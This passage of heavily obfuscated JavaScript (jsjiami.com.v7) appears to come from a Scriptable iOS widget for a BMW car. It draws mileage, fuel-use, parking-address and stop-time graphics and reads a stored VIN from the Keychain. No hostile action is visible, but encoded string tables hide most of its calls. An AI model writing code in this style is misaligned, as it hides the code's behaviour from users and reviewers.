_0x44bf4c=(function(){return[version_,'yOIjsPOnjeXxiLaYnmVCQif.cWBoCqQmHVV.v7xJ==','s35gWQRdJ8krWRddKW','tSonW7ugumovW60','B8omcvhdSmofW53cKNi','5P2D6kYm5AEk6lsx','W7NcUCkWWOqK','W6RdTMvyWQhdV8ojo8kWlY3dM8ks','WPJdJmoTW7/cMNddO8o5','W4z8nCowA8oummkInSkKWOm9FN0','5BYw5PYU57wV6k24da','aSovWOxdOmkA','5BQA5z6m5Rkw6iglW6y','W5/cI8kpDh3cQfC','W6/cPmkKWP0uaLFdVw4JWQ4YWPrQ','iHbfW6lcLSo5WRK','5OgD6ysu56UuBSoq','f8oJpCo6WQOdW6KJi8kZv8kNvq'].concat((function(){return['n0G4tmoaj1NdPCkeWQKNW6lcKG','W6ncWRCAsJq5W6H3W54H','hIvlWQtdKCkSWP/dHCkbW6FdKmkwWPddKGenWPiNWRy','WOxcRwjNxKVcV2VdRZBcLIq','kSkyB8k3B0Pr','mCo8WPFcG8kUrmoJW7lcNa','W7BcJCkyW4PKW7xcGSo4WOi','WPSYWOZcICkmWPtdQCoPWOxcK8oEsSoCW6DLW7KbWOO','ASozjvRdSfKVWPG','WRJdMCklW6/dIgVdQee','WRPaWQ0mAmkvBSo4','zmk+W4lcNSkuy8o8W5FcKv7dKCouW4tcMW','yb12W7pcS8o2WQm/wa3cImo3','FSomW6SxW6jxW7KnkuZcKq5a','amk/d0SnrCkAdq','W5G/WRJcRSkLWPtdQW','uCk7Fceu','F8opiSobmHCDWO3cVCoaW7BdNCk6'].concat((function(){return['WRFdMmoAWQhcJaNdTNpcS8kMWPZdQq','W5dcVdxcPbpdPMldGCopdq','ESoikCofmHDTWRlcMSoCW4tdKq','W5rGW6alDSo2WR/dLtBdJseSWOfTqSoIWRlcMSkryq','c8ocW79DzmkaWR5o','WRqfW6vBdXC','W5hcUZVcOKBcUHRdMSohn8kbn8oE','yXX0o8kxCr/dPmkHWRuGW6G','fCkZf2e2tmkvoSklWOhcSSkI','x8ksWQCbaCovWO1sW71/WPu+','WOldTuZcG8oPWOddMSkyi8oqWRFcTmktWQu','6kc/6AI85QYe5PAGWPK','E8oek8kdCe1XWOJcJa','WRf7o8kSW6DOWOJdOeZcRq','WO3dGmo1W4FcRw3dTmooC8kSg8kz','cCoQW647WRO'];}()));}()));}());_0x4292=function(){return _0x44bf4c;};return _0x4292();};canvas['size']=new Size(canvasWidth,canvasHeight),canvas[_0x197e50(0xfa,'QBU[')]=![],canvas['setFont'](this['getFont'](WIDGET_FONT_BOLD,Math[_0x197e50(0x109,'P)$^')](canvasHeight/3.5))),canvas[_0x197e50(0x103,'J(WJ')](this[_0x197e50(0xfc,'8IGj')]()),canvas[_0x197e50(0x11c,'8p7a')]=!![];let leftOffest=0x14,heightOffest=0xa,h=0x11,b=0x7,str0='',str1='',str2='';canvas['setFont'](this[_0x197e50(0x119,'DP@%')](WIDGET_FONT_BOLD,0xc)),canvas[_0x197e50(0xfd,'O17L')](new Color(_0x197e50(0x106,'!^U!'),0.8)),canvas[_0x197e50(0xf9,'!^U!')](new Rect(leftOffest,heightOffest,0x3,h)),canvas[_0x197e50(0x10b,'J(WJ')](new Rect(leftOffest,heightOffest+(h+b),0x3,h)),canvas[_0x197e50(0x123,'O17L')](new Rect(leftOffest,heightOffest+(h+b)*0x2,0x3,h));data[_0x197e50(0x118,'wT^M')]?(str0=_0x197e50(0x100,'iEgP')+data[_0x197e50(0x117,'iEgP')],str1=_0x197e50(0x10d,'@iB[')+data[_0x197e50(0xf8,'dQkt')]+'\x20Km',str2=_0x197e50(0x10f,')MhF')+data['monthlyConsumption']['averageFuelConsumption']+'\x20L'):(str0='查询失败',str1=_0x197e50(0x108,'5nyZ'),str2='查询失败');canvas[_0x197e50(0x10c,'7O*H')](str0,new Rect(leftOffest+0x6,heightOffest+0x1,Math[_0x197e50(0xf3,'IDNY')](canvasWidth*0.9),h)),canvas[_0x197e50(0xff,'zqIo')](str1,new Rect(leftOffest+0x6,heightOffest+(h+b)+0x1,Math[_0x197e50(0x104,'od2H')](canvasWidth*0.9),h)),canvas[_0x197e50(0x111,'P)$^')](str2,new Rect(leftOffest+0x6,heightOffest+(h+b)*0x2+0x1,Math['round'](canvasWidth*0.9),h)),canvas[_0x197e50(0x121,'CZju')](new Color('#00ff00',0.8)),canvas['fillRect'](new Rect(leftOffest,heightOffest+(h+b)*0x3+0x5,0x3,h/1.5)),canvas['setFont'](this[_0x197e50(0x110,'5nyZ')](WIDGET_FONT_BOLD,0x8)),str0=_0x197e50(0x113,'%Mo#')+currentMileage+'\x20km',canvas[_0x197e50(0x120,'wrVU')](str0,new Rect(leftOffest+0x6,heightOffest+(h+b)*0x3+0x6,Math[_0x197e50(0x10e,'IRsj')](canvasWidth*0.9),h));return canvas[_0x197e50(0x11f,'EbG)')]();var version_ = 'jsjiami.com.v7';
  }
  getStopCanvasImage=async function(data, canvasWidth, canvasHeight, sdata) {
    var version_='jsjiami.com.v7';function _0x4eb2(){const _0x38e5c5=(function(){return[version_,'FnXjtsYjXiUahwmFiBpT.cCAdotpmE.tWv7JrnCL==','t8kVWQZcJCkiWPixuNyOW63dRG','j2L6F8kt','W6tdRw08W7hcTMOkW7e','WRDqW5xcNXW','W45bW58ceW','W69XW4JdUXNdLZi','emkMymk+Fb7dJumRWP7dMG','WRpdN8oIk8ovf8kY','WOhcJcBcKmotWOtcVCorjCo/r8o1CbW','AWLlcNW','eqTVWRi6WRBcTsvo','WQFdVISUWQe','b8o/c8kkW7O0W7r8','WRz8lXLU','WPxcJcBcHCoiWPJcPG','W5WizH1u','WOjOkc/cUmktiG','WP3dKexcNCoDWOZcMqlcNCot','w8kHyW7dVHNdKa','W7ldHMGfW5C','e8o5eSkiW4W','orVdLSk2mG','W5i1f0eq','W7ZdMmo3AmoNvCoRba','WQVcPCokW4ZdUZm6DCoeWRlcMW4','WPZcQXfFaG','E8kBq2i6of5V','xSozW55rWRi','FWnhWPjzW6P5r8k0suBdSG','WP9pWQXNAa','W4qOa1G9W5ZcJmkBxmocW4PkgHVcHG'].concat((function(){return['W4/dHmoXWOigFmkAxmkuwXxcKConuG','WP3dGupcTmoFWOxcPYtcKColW5XS','WOhcJcBcHCooWPRcVSo5l8oqr8oR','hSoNWPqjWOBdNmk2W4JdOSkPBIr6vSkTW67dH2xdS3O','bSoZe8kGW4CJW7PPjSkfWRhdQW','s8oXx2pdLv/cICki','v8o7lmojibldUW','WP/cJSkOW4rHE8kGwCkuCXu','sCoJDmknpq','uCkPWRRcHSkc','FGnkiNCxW6K','t1uTWQK4WORcTGH5','fCkSAmk6gtFdN0uJWOa','smoeW4PiWOiosmksnSkHW7VcK8k0WPS','W7ddIg8yW5y','W45uW4C/aJlcHhb+W4/cPCov','WO3dI1NcHSoxWOdcPrq','WQNcQSkJWQxcHhiAxG','amoNWOigWPy','pbxdKCk2','W6WOxSkgc8kmxHi7W6VdGCo+','jaSUuJ8','W6ldMCoBWRPx','AmoHfvrM','B2ddQ8kNWR0rWP/dT8okW6e','W6WOxSkbgSkgrtOXW4tdGCoGp8og','W60IWQxcMti','W6pdKmo+Eq','W6hdNmoApNBdMCoteW','v8kVWQlcJq','lfybW6aaWRjQyCkHyL7dIW','a8oDD8o5W5NcReBcJq','WOTjWRvLxSohWOtcHq'].concat((function(){return['W6JdS8kmWPhcRq','sCoWpqhcObRdLSkbW4vuW6CYCq','bCoKbSkrW7W0W698g8kFWOBdVmkiWRK','mxrUzSkJwCo+DKjnemonfrS','WPfJuX1nW7ZcP8kLy8oXW4W','AGnkkhexW7Gjz8kQxCoG','WRhdOZ83WPhcRYacWOHBW7ldUbpdPa','WPldQftcG8kmiCkOWPNdSWW','Avn4WQVcMmkenCoHWQi','W49EW4yfaW','naGWsgxdSCkgaSo0','WP3cSuHNcJBcTWS','WOdcHIFcRCod','WQlcGSkDW61CeSksWOhcN8o0','W5tdHmorWPaD','yhtcRMC2b2fSC8oDWQZdOq','WPZdI0lcNmos','bqTOWRe/','WRDEof56vCoJ','WOJdKmo2W4vIkCos','WPBcU19aethcRa','cZ7cUvv9','f8oBBSo7W68','WOpcSv5OgG','W657W4NdKXi','rmkJWRS','fZdcOv59','WRBcGSkoAHZcJ8kgaSkpWOFcLJra','twddTan3W43dQu3cUCoh','WPL6WQVcJSkwWOdcNtmXWONcJfG','uCo8W4hdRSk3W5nm','WQBdPsWVWQ7cRWOtWQjb'];}()));}()));}());_0x4eb2=function(){return _0x38e5c5;};return _0x4eb2();};const _0x1c2c98=_0x8044;function _0x8044(_0x530471,_0x4c5868){const _0x4eb227=_0x4eb2();return _0x8044=function(_0x804427,_0x394e20){_0x804427=_0x804427-0x112;let _0x329dbe=_0x4eb227[_0x804427];if(_0x8044['wROBPr']===undefined){var _0x56f265=function(_0x1ad622){const _0x2ac0a0='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x5174cf='',_0x152b2d='';for(let _0x9e7f31=0x0,_0x4e526e,_0x3451c4,_0x1469eb=0x0;_0x3451c4=_0x1ad622['charAt'](_0x1469eb++);~_0x3451c4&&(_0x4e526e=_0x9e7f31%0x4?_0x4e526e*0x40+_0x3451c4:_0x3451c4,_0x9e7f31++%0x4)?_0x5174cf+=String['fromCharCode'](0xff&_0x4e526e>>(-0x2*_0x9e7f31&0x6)):0x0){_0x3451c4=_0x2ac0a0['indexOf'](_0x3451c4);}for(let _0x55368b=0x0,_0x310559=_0x5174cf['length'];_0x55368b<_0x310559;_0x55368b++){_0x152b2d+='%'+('00'+_0x5174cf['charCodeAt'](_0x55368b)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x152b2d);};const _0x58babb=function(_0x2f5203,_0x3a13af){let _0x2954cf=[],_0x4221c0=0x0,_0x152840,_0x14b6ca='';_0x2f5203=_0x56f265(_0x2f5203);let _0x4578d8;for(_0x4578d8=0x0;_0x4578d8<0x100;_0x4578d8++){_0x2954cf[_0x4578d8]=_0x4578d8;}for(_0x4578d8=0x0;_0x4578d8<0x100;_0x4578d8++){_0x4221c0=(_0x4221c0+_0x2954cf[_0x4578d8]+_0x3a13af['charCodeAt'](_0x4578d8%_0x3a13af['length']))%0x100,_0x152840=_0x2954cf[_0x4578d8],_0x2954cf[_0x4578d8]=_0x2954cf[_0x4221c0],_0x2954cf[_0x4221c0]=_0x152840;}_0x4578d8=0x0,_0x4221c0=0x0;for(let _0x555576=0x0;_0x555576<_0x2f5203['length'];_0x555576++){_0x4578d8=(_0x4578d8+0x1)%0x100,_0x4221c0=(_0x4221c0+_0x2954cf[_0x4578d8])%0x100,_0x152840=_0x2954cf[_0x4578d8],_0x2954cf[_0x4578d8]=_0x2954cf[_0x4221c0],_0x2954cf[_0x4221c0]=_0x152840,_0x14b6ca+=String['fromCharCode'](_0x2f5203['charCodeAt'](_0x555576)^_0x2954cf[(_0x2954cf[_0x4578d8]+_0x2954cf[_0x4221c0])%0x100]);}return _0x14b6ca;};_0x8044['xOvtkT']=_0x58babb,_0x530471=arguments,_0x8044['wROBPr']=!![];}const _0x4442d4=_0x4eb227[0x0],_0x4bf81a=_0x804427+_0x4442d4,_0x2f6a05=_0x530471[_0x4bf81a];return!_0x2f6a05?(_0x8044['oowLmi']===undefined&&(_0x8044['oowLmi']=!![]),_0x329dbe=_0x8044['xOvtkT'](_0x329dbe,_0x394e20),_0x530471[_0x4bf81a]=_0x329dbe):_0x329dbe=_0x2f6a05,_0x329dbe;},_0x8044(_0x530471,_0x4c5868);}(function(_0x179ec0,_0x549bd1,_0x2607e5,_0x583a93,_0x48de1d,_0x1cfae1,_0x45cbae){return _0x179ec0=_0x179ec0>>0x5,_0x1cfae1='hs',_0x45cbae='hs',function(_0x25f2de,_0x18508d,_0x627c76,_0x1e8734,_0x3e2c70){const _0x1b1791=_0x8044;_0x1e8734='tfi',_0x1cfae1=_0x1e8734+_0x1cfae1,_0x3e2c70='up',_0x45cbae+=_0x3e2c70,_0x1cfae1=_0x627c76(_0x1cfae1),_0x45cbae=_0x627c76(_0x45cbae),_0x627c76=0x0;const _0x487b03=_0x25f2de();while(!![]&&--_0x583a93+_0x18508d){try{_0x1e8734=parseInt(_0x1b1791(0x11f,'O%8B'))/0x1+-parseInt(_0x1b1791(0x16d,'TNp*'))/0x2+parseInt(_0x1b1791(0x156,'3TW5'))/0x3*(-parseInt(_0x1b1791(0x154,'yWk*'))/0x4)+-parseInt(_0x1b1791(0x15b,'ndL['))/0x5*(-parseInt(_0x1b1791(0x12c,'r)]g'))/0x6)+parseInt(_0x1b1791(0x12b,'#EeU'))/0x7+parseInt(_0x1b1791(0x118,'K3Uh'))/0x8*(parseInt(_0x1b1791(0x11d,'e7rC'))/0x9)+-parseInt(_0x1b1791(0x15a,'FezZ'))/0xa*(parseInt(_0x1b1791(0x114,'rbwt'))/0xb);}catch(_0x5e809b){_0x1e8734=_0x627c76;}finally{_0x3e2c70=_0x487b03[_0x1cfae1]();if(_0x179ec0<=_0x583a93)_0x627c76?_0x48de1d?_0x1e8734=_0x3e2c70:_0x48de1d=_0x3e2c70:_0x627c76=_0x3e2c70;else{if(_0x627c76==_0x48de1d['replace'](/[TnFhYLwBACEWXrpdJUt=]/g,'')){if(_0x1e8734===_0x18508d){_0x487b03['un'+_0x1cfae1](_0x3e2c70);break;}_0x487b03[_0x45cbae](_0x3e2c70);}}}}}(_0x2607e5,_0x549bd1,function(_0x28c40c,_0x232ac1,_0x3d4304,_0x114a51,_0x62c7ef,_0x1d4f74,_0x469865){return _0x232ac1='\x73\x70\x6c\x69\x74',_0x28c40c=arguments[0x0],_0x28c40c=_0x28c40c[_0x232ac1](''),_0x3d4304='\x72\x65\x76\x65\x72\x73\x65',_0x28c40c=_0x28c40c[_0x3d4304]('\x76'),_0x114a51='\x6a\x6f\x69\x6e',(0x12a7c9,_0x28c40c[_0x114a51](''));});}(0x1960,0x212c7,_0x4eb2,0xcd),_0x4eb2)&&(version_=_0x4eb2);let fontBase=0xe,canvas=new DrawContext();canvas[_0x1c2c98(0x16a,'0vSf')]=new Size(canvasWidth,canvasHeight*1.1),canvas['opaque']=![],canvas['setFont'](this[_0x1c2c98(0x159,'[Jnk')](WIDGET_FONT_BOLD,fontBase)),canvas[_0x1c2c98(0x163,'dI]4')](this[_0x1c2c98(0x14c,'TNp*')]()),canvas['respectScreenScale']=!![];let bb={};if(data['status'])bb=data[_0x1c2c98(0x147,'0vSf')]['end'][_0x1c2c98(0x16c,'7be8')];let line=await this[_0x1c2c98(0x153,'#A(@')](bb);try{canvas[_0x1c2c98(0x168,'dI]4')](new Color(_0x1c2c98(0x122,'i6O*'),0.6)),canvas[_0x1c2c98(0x167,'Bjw*')](new Rect(Math['round']((canvasWidth-0x8c)/0x2),Math['round'](0x14)-0x1,0x28,0x28)),canvas[_0x1c2c98(0x12f,'dYv#')](new Rect(Math[_0x1c2c98(0x127,'IysL')]((canvasWidth-0x8c)/0x2+0x32),Math['round'](0x14)-0x1,0x28,0x28)),canvas['strokeRect'](new Rect(Math['round']((canvasWidth-0x8c)/0x2+0x64),Math[_0x1c2c98(0x158,'7be8')](0x14)-0x1,0x28,0x28)),canvas[_0x1c2c98(0x135,'RCHu')](this[_0x1c2c98(0x124,'IysL')](WIDGET_FONT_BOLD,0xc));if(Keychain[_0x1c2c98(0x15f,'WLEO')](MY_BMW_VEHICLE_VIN))canvas[_0x1c2c98(0x15c,'3ZGB')](JSON[_0x1c2c98(0x15d,'7tJ)')](Keychain[_0x1c2c98(0x129,'7be8')](MY_BMW_VEHICLE_VIN))[_0x1c2c98(0x130,'7be8')],new Rect(Math[_0x1c2c98(0x146,'rbwt')](0xf),Math[_0x1c2c98(0x157,'VBJL')](0x0),Math[_0x1c2c98(0x145,'b!TP')](canvasWidth*0.7),0xf));let exclamation=SFSymbol[_0x1c2c98(0x12a,'r)]g')](_0x1c2c98(0x152,'3b)n'))[_0x1c2c98(0x169,'^S@b')];canvas[_0x1c2c98(0x14e,'rbwt')](exclamation,new Rect(Math[_0x1c2c98(0x144,'#A(@')](0xc),Math['round'](0x14+0x38),0xa,0xa)),canvas[_0x1c2c98(0x140,'fy^E')](this[_0x1c2c98(0x13e,'sx0!')](WIDGET_FONT_BOLD,8.5)),canvas[_0x1c2c98(0x15e,']MZ[')](new Color(_0x1c2c98(0x123,'3TW5'),0.5));let c1=/^(.*?[市省自治区])(.*?[市区])(.*)$/,s1=sdata['state'][_0x1c2c98(0x11b,'IysL')]['address'][_0x1c2c98(0x13a,'FezZ')]['replace'](c1,'$3');canvas['drawTextInRect'](s1,new Rect(Math[_0x1c2c98(0x143,'7tJ)')](0x17),Math[_0x1c2c98(0x143,'7tJ)')](0x14+0x38),Math['round'](canvasWidth*0.7),0x32)),canvas['setFont'](this['getFont'](WIDGET_FONT_BOLD,0x8)),canvas[_0x1c2c98(0x12d,'yhUo')](this['getFontColor']()),canvas[_0x1c2c98(0x113,'99pt')]('Days',new Rect(Math['round']((canvasWidth-0x8c)/0x2+0xa),Math[_0x1c2c98(0x161,'3b)n')](0x14+0x29),Math[_0x1c2c98(0x14d,'$D*O')](canvasWidth*0.3),0xd)),canvas['drawTextInRect'](_0x1c2c98(0x149,'Snmy'),new Rect(Math[_0x1c2c98(0x139,'[Jnk')]((canvasWidth-0x8c)/0x2+0x3a),Math[_0x1c2c98(0x170,'L(2D')](0x14+0x29),Math['round'](canvasWidth*0.3),0xd)),canvas['drawTextInRect']('Minutes',new Rect(Math['round']((canvasWidth-0x8c)/0x2+0x67),Math[_0x1c2c98(0x14b,'3ZGB')](0x14+0x29),Math['round'](canvasWidth*0.3),0xd)),canvas[_0x1c2c98(0x155,'ndL[')](this[_0x1c2c98(0x12e,'9Wi@')](WIDGET_FONT_BOLD,0x10)),canvas[_0x1c2c98(0x112,'#A(@')](line['z'],new Rect(Math[_0x1c2c98(0x131,'99pt')]((canvasWidth-0x8c)/0x2+0x9),Math['round'](0x14+0xa)-0x1,Math[_0x1c2c98(0x11e,'Ru$7')](canvasWidth*0.3),0x10)),canvas[_0x1c2c98(0x116,'dYv#')](line['x'],new Rect(Math[_0x1c2c98(0x133,'L9tS')]((canvasWidth-0x8c)/0x2+0x3b),Math[_0x1c2c98(0x166,'42sT')](0x14+0xa)-0x1,Math[_0x1c2c98(0x13d,'M!GY')](canvasWidth*0.3),0x10)),canvas[_0x1c2c98(0x14f,'3TW5')](line['c'],new Rect(Math[_0x1c2c98(0x128,'RCHu')]((canvasWidth-0x8c)/0x2+0x6d),Math[_0x1c2c98(0x13f,'W4Qq')](0x14+0xa)-0x1,Math[_0x1c2c98(0x11c,'sx0!')](canvasWidth*0.3),0x10));{canvas[_0x1c2c98(0x138,'sx0!')](new Color(_0x1c2c98(0x137,'0vSf'),0.8)),canvas[_0x1c2c98(0x115,'[Jnk')](0x3),canvas[_0x1c2c98(0x141,'WLEO')](new Rect(Math['round']((canvasWidth-0x8c)/0x2),Math[_0x1c2c98(0x126,'39@p')](0x14)-0x1,0x28,0x28));}canvas[_0x1c2c98(0x150,'WLEO')](new Color('#ff7f00',0.8));{canvas[_0x1c2c98(0x13c,'#A(@')](new Rect(Math[_0x1c2c98(0x145,'b!TP')]((canvasWidth-0x8c)/0x2+0x32+0x14),Math[_0x1c2c98(0x164,'WDaU')](0x14)-0x1-0x1,line['q']>0x0?line['q']+0x2:line['q'],0x3)),canvas[_0x1c2c98(0x16e,'39@p')](new Rect(Math[_0x1c2c98(0x158,'7be8')]((canvasWidth-0x8c)/0x2+0x32+0x28-0x1),Math['round'](0x14)+0x2-0x1,0x3,line['w'])),canvas[_0x1c2c98(0x14a,'o4Lw')](new Rect(Math['round']((canvasWidth-0x8c)/0x2+0x32+0x28-line['e']-0x2),Math['round'](0x14+0x28-0x1)-0x1,line['e']>0x0?line['e']+0x1:line['e'],0x3)),canvas['fillRect'](new Rect(Math[_0x1c2c98(0x131,'99pt')]((canvasWidth-0x8c)/0x2+0x32-0x2),Math[_0x1c2c98(0x119,']MZ[')](0x14+0x28-line['r']+0x2)-0x1,0x3,line['r']>0x2?line['r']-0x3:0x0)),canvas['fillRect'](new Rect(Math[_0x1c2c98(0x121,'FezZ')]((canvasWidth-0x8c)/0x2+0x32-0x2),Math['round'](0x14)-0x1-0x1,line['t']>0x0?line['t']+0x2:line['t'],0x3));}canvas[_0x1c2c98(0x151,'sx0!')](new Color(_0x1c2c98(0x142,'yWk*'),0.8));{const oJwNRZ=_0x1c2c98(0x132,'dYv#')[_0x1c2c98(0x134,']MZ[')]('|');let BnDvNh=0x0;while(!![]){switch(oJwNRZ[BnDvNh++]){case'0':canvas[_0x1c2c98(0x16f,'$D*O')](new Rect(Math[_0x1c2c98(0x125,'r)]g')]((canvasWidth-0x8c)/0x2+0x64-0x2),Math[_0x1c2c98(0x11e,'Ru$7')](0x14)-0x1-0x1,line['g']>0x0?line['g']+0x2:line['g'],0x3));continue;case'1':canvas['fillRect'](new Rect(Math[_0x1c2c98(0x13b,'dYv#')]((canvasWidth-0x8c)/0x2+0x64+0x14),Math[_0x1c2c98(0x165,'e7rC')](0x14)-0x1-0x1,line['a']>0x0?line['a']+0x2:line['a'],0x3));continue;case'2':canvas['fillRect'](new Rect(Math[_0x1c2c98(0x161,'3b)n')]((canvasWidth-0x8c)/0x2+0x64-0x2),Math[_0x1c2c98(0x128,'RCHu')](0x14+0x28-line['f']+0x2)-0x1,0x3,line['f']>0x2?line['f']-0x3:0x0));continue;case'3':canvas[_0x1c2c98(0x16b,'#EeU')](new Rect(Math['round']((canvasWidth-0x8c)/0x2+0x64+0x28-0x1),Math[_0x1c2c98(0x13d,'M!GY')](0x14)+0x2-0x1,0x3,line['s']));continue;case'4':canvas['fillRect'](new Rect(Math[_0x1c2c98(0x120,'WLEO')]((canvasWidth-0x8c)/0x2+0x64+0x28-line['d']-0x2),Math[_0x1c2c98(0x127,'IysL')](0x14+0x28-0x1)-0x1,line['d']>0x0?line['d']+0x1:line['d'],0x3));continue;}break;}}}catch(_0x570760){console[_0x1c2c98(0x162,'b!TP')](_0x570760['message']);}return canvas['getImage']();var version_ = 'jsjiami.com.v7';
  }
  getBaseCanvasImage=async function(data, canvasWidth, canvasHeight, resizeRate) {
    var version_='jsjiami.com.v7';const _0x12a7f1=_0x1261;(function(_0x478efa,_0x492074,_0x443a28,_0x16ecce,_0xe151f0,_0x4f1e31,_0x26993a){return _0x478efa=_0x478efa>>0x3,_0x4f1e31='hs',_0x26993a='hs',function(_0x180ed0,_0x9f81ab,_0x53e0fd,_0x43c80d,_0x559c47){const _0x1c159e=_0x1261;_0x43c80d='tfi',_0x4f1e31=_0x43c80d+_0x4f1e31,_0x559c47='up',_0x26993a+=_0x559c47,_0x4f1e31=_0x53e0fd(_0x4f1e31),_0x26993a=_0x53e0fd(_0x26993a),_0x53e0fd=0x0;const _0x1ab51f=_0x180ed0();while(!![]&&--_0x16ecce+_0x9f81ab){try{_0x43c80d=-parseInt(_0x1c159e(0xb7,'DJKk'))/0x1+-parseInt(_0x1c159e(0xde,'cz0f'))/0x2+-parseInt(_0x1c159e(0xaf,'M7xz'))/0x3*(-parseInt(_0x1c159e(0xeb,'8k*M'))/0x4)+-parseInt(_0x1c159e(0xdc,'E]jM'))/0x5*(parseInt(_0x1c159e(0xc7,'Y5pB'))/0x6)+parseInt(_0x1c159e(0xad,'xgfy'))/0x7*(-parseInt(_0x1c159e(0xba,'u]IA'))/0x8)+parseInt(_0x1c159e(0xd0,'M7xz'))/0x9+-parseInt(_0x1c159e(0xd1,'CVXB'))/0xa*(-parseInt(_0x1c159e(0xbb,'fCNL'))/0xb);}catch(_0x45c62a){_0x43c80d=_0x53e0fd;}finally{_0x559c47=_0x1ab51f[_0x4f1e31]();if(_0x478efa<=_0x16ecce)_0x53e0fd?_0xe151f0?_0x43c80d=_0x559c47:_0xe151f0=_0x559c47:_0x53e0fd=_0x559c47;else{if(_0x53e0fd==_0xe151f0['replace'](/[JQVewgSWEdLnqhDf=]/g,'')){if(_0x43c80d===_0x9f81ab){_0x1ab51f['un'+_0x4f1e31](_0x559c47);break;}_0x1ab51f[_0x26993a](_0x559c47);}}}}}(_0x443a28,_0x492074,function(_0x135b96,_0x1d6fc7,_0x45391c,_0x13967a,_0x4b1833,_0x40c051,_0xdae629){return _0x1d6fc7='\x73\x70\x6c\x69\x74',_0x135b96=arguments[0x0],_0x135b96=_0x135b96[_0x1d6fc7](''),_0x45391c='\x72\x65\x76\x65\x72\x73\x65',_0x135b96=_0x135b96[_0x45391c]('\x76'),_0x13967a='\x6a\x6f\x69\x6e',(0x1298bc,_0x135b96[_0x13967a](''));});}(0x638,0xb37a4,_0x113d,0xc9),_0x113d)&&(version_=_0x113d);function _0x113d(){const _0x2dc960=(function(){return[version_,'QDnjeShsngLjdwiamgih.cqoVmEn.wve7SDWfSgJ==','W6bGia/cMCkxW5W','lYZcUSoNWQRdHxyuCs3cKtJcKq','WR3dG8oFb3FdNt9h','cK3cQCk+eSkOWRJcNaiT','W5LddbKdiSkIF8k3WPVdL1C','oNxcLmkcpmkj','W7vgWQ8CnCoGaG1Qoh3dRa','hKBcQmknC23dG8ok','W7CPWQnSWRS','y8oDW7G/WOxcUSk0W7lcOW','b8kxWQ/dUmoel8k/kSokW6r7WR8','kHdcMCoHWRRcRGy','BJBcLCorWOBcTdXpw8kXs8oo','WOlcQMFcRfFcVSoocdhdKCkEWPhcNa','W7LztColWPBdKKbq','EJBcLComWO7cRs9P','cCkwWQ7dSCobk8oNd8oKW6r/WRSW','t8oAp8or','W4/dUmoDW4dcJdBcVmknFhK','W73dOKSPkJRcT0K3xa','W4NcOqjF','WQVcTchcOw42WRJcPIhdTW','grFdIqtdKbddTgpcL3m8rxX4WRa','W5TaWP/cQmoA','WPqMW5ldH8orW6rmW5JdOWuUFG'].concat((function(){return['ovhcLCoIWO/cNmoeW4r4','W4n5W7pdHCo0W714W70','qmodW7PAWOBdVCk0uW','WQmoD8onWORdVa','WRdcRZZcQG','WQyyuKucpSk4CSkP','W4hdTSoKvwy','oLpcVwRdMSkaoLtcK8oC','W6BcPfL6WQa','WPbrlX3cOSkLdIZcS8oLfmk7W6dcTmoC','WRFdHCkcrtVcMunRu8oyvJBdQG','ymkosMddQ8k8WQdcR8kBW7mfWOfXfa','FSorWRtdUa','ruy4sSoXW65KWRPtW5hcVCk2','W4qOrHmm','WOOfxfz7FCkPE8kRWOddQM/dH2BdQW','WOhcSSoluvvGf1W','oH5yWQa3sxtdPSkRmCkl','cmo8tsjwvG','bmo2sZDnCCodlSkjWRe','W6NcLCogixZdIGnKACoTza','jN1QeCk0W6FdRhe7WO8V','AgzCW6NdRghdHmokpZpcRhW','m3DRkSkJ','ebD+mCkLWRG3WP55W77cOSkFWQC','WQ0cCSogWRddRuT8','WRZcIt/cU8otmq'].concat((function(){return['mMX/mmkI','uColW6ry','jmkTWRtcRKJcLW','lXPyWPbK','W68WWQzPWQzv','e8oTvIXqrCoEkCke','ECoAp8ofW5BcMYBcJq8','W7NcMCowagC','ACoxWQhdR8oqFfz6g3S','WPyGW5hdMCoWW7voW5G','h8kgzmkBWOddKJlcRsui','W7fgWQvjtCo5cr0','W5DjyCoBC8koW6ldLfVcOSoYgCo+W67cGG7cNCkf','W4aOwai','WPdcTcxcUmkSWONcG3VdLmkVA1ldVSoTW7yeW47cSenMW6O','W4jjzSo+zCkiW6tdJLxcT8oY','xmoCpSohWOJdGIxcSbWbWP7cHq','W5BdRCoQu3bEnMWyBa','WR/cPsFcM3y2WPJcII/dPaW','nSoCdHxcSSoNW6C','nsijWQJcKtNdN8omfspcT0lcTbVdSW','gSoyydJdV0viCu/dVx/dIGlcR8km','FwVdRmkLW5lcNYebDWFcTadcT8kFWQu','y8knsghdPmk+WQFdNSknW7qmWQjU','ueW5BCo4'];}()));}()));}());_0x113d=function(){return _0x2dc960;};return _0x113d();};let canvas=new DrawContext();canvas[_0x12a7f1(0xd2,'Ygeg')]=new Size(canvasWidth,canvasHeight),canvas[_0x12a7f1(0xe5,'dl36')]=![],canvas['setFont'](this[_0x12a7f1(0xa7,'CVXB')](WIDGET_FONT_BOLD,Math['round'](canvasHeight/3.5))),canvas[_0x12a7f1(0xb9,'F^47')](this['getFontColor']()),canvas[_0x12a7f1(0xed,'uRnZ')]=!![];let leftOffest=Math[_0x12a7f1(0xac,'cz0f')]((canvasWidth-0x69)/0x2),heightOffest=0x34;function _0x1261(_0x2c2d40,_0x3ad289){const _0x113dc0=_0x113d();return _0x1261=function(_0x1261c4,_0x2f0b64){_0x1261c4=_0x1261c4-0xa1;let _0xe90863=_0x113dc0[_0x1261c4];if(_0x1261['TmLjUb']===undefined){var _0x4b0687=function(_0x297281){const _0x4e6fe1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0xb84e54='',_0x2d2480='';for(let _0x2e173b=0x0,_0x559ede,_0x4a314b,_0x10b5b0=0x0;_0x4a314b=_0x297281['charAt'](_0x10b5b0++);~_0x4a314b&&(_0x559ede=_0x2e173b%0x4?_0x559ede*0x40+_0x4a314b:_0x4a314b,_0x2e173b++%0x4)?_0xb84e54+=String['fromCharCode'](0xff&_0x559ede>>(-0x2*_0x2e173b&0x6)):0x0){_0x4a314b=_0x4e6fe1['indexOf'](_0x4a314b);}for(let _0x233e69=0x0,_0x434dfb=_0xb84e54['length'];_0x233e69<_0x434dfb;_0x233e69++){_0x2d2480+='%'+('00'+_0xb84e54['charCodeAt'](_0x233e69)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2d2480);};const _0x58c122=function(_0x17a1f6,_0x866dd2){let 